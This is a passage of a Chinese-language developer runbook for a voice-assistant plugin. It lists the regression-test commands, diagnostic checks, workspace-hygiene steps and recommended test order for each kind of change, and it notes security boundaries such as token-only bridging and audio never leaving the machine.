     试完请把结果记进 `docs/research/prototype-results.md` —— 不管成没成。

安全边界照旧，不需要验但要知道：这条路上 `speaker` 永远是 `None`，所以 `shell.run` 进不来；
Vox 麦克风录到的音频永不出网（`core/channels/` 不 import 采集侧）。

## EvoX 会话桥接回归

适用时机：修改 `core/session_bridge.py`、认证头、桥接 URL、turn 取消路径或响应格式后。

```powershell
python -m pytest tests/test_session_bridge.py tests/test_plugin_tools.py -q
```

桥接必须携带 bearer token；明文 HTTP 只允许 `localhost` 或 IP loopback；HTTPS 可用于远端端点；`turn_id` 会进行 URL 编码。真实 EvoX 服务尚未在本机提供可验证的测试端点，因此当前测试使用本地临时 HTTP 服务。

## 诊断与设备检查

适用时机：用户反馈“没有唤醒”“没有麦克风”“会话不回消息”时。

```powershell
python -c "from vox_plugin import VoicePlugin; import json; print(json.dumps(VoicePlugin().diagnose(), ensure_ascii=False, indent=2))"
```

诊断只输出 provider、桥接 URL 是否配置 token、音频后端可用性和设备列表，不输出 token 内容。设备枚举失败时先看 `reason`，再决定是否安装 `sounddevice` 或系统音频驱动。

## 修改前后的工作区检查

适用时机：开始一轮较大修改、准备提交或接手隔夜工作区时。

```powershell
git status --short
rg --files -g '!desktop/node_modules' -g '!.venv' | sort
rg "TODO|FIXME|release blocker|not verified" core vox_plugin desktop docs tests scripts
```

先确认已有用户修改，不要覆盖无关脏文件；再根据未验证项选择最小回归范围。

## 推荐执行顺序

- 小型 Python 修改：日常最小回归。
- 事件或状态修改：契约回归，然后日常最小回归。
- 音频/provider 修改：Provider 回归、KWS 隔离验证，然后日常最小回归。
- 声纹修改：声纹回归，然后日常最小回归；阈值改动额外看 `diagnose()`。
- 平台层修改：对应的工具/记忆/agent/派发回归，然后日常最小回归。
- 前端修改：`npm run build`；窗口属性修改再加 `cargo check` 和 Windows 实机验收。
- 模型或依赖变更：记录版本、来源、归档校验结果到 `THIRD_PARTY_NOTICES.md` 和 `docs/research/prototype-results.md`。

每个阶段收尾一律跑全量 `.\.venv\Scripts\python.exe -m pytest tests -q --basetemp .pytest-run`（当前基线 **1211 passed, 3 skipped**），不用单文件绿灯代替全量。
